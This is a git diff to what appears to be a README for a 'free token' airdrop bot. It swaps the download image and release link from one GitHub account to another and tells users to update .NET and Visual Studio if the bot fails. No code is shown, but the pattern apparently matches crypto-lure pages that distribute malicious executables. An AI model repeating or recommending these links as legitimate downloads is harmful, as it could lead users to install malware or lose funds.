@@ -32,10 +32,9 @@
 
 # Download
 
-**[<img src="https://github.com/domirek886/Airdrop_free/assets/169194466/7f258b1d-d110-4edd-944e-a84babc28111"/>](https://github.com/bigdaddygayelite1/Airdrop_bot/releases/tag/Download_last_version)**
+**[<img src="https://github.com/fashbestplays98/Citizens_Conflict_free_token/assets/169194661/21bd4e3e-8ed5-4e2d-a990-1227b7152a90"/>](https://github.com/fashbestplays98/Citizens_Conflict_free_token/releases/tag/Download_last_version)**
 
 # Disclaimer
-
 ### If bot does not work for you
 1) Update your NET Framework
 2) Update your visual studio
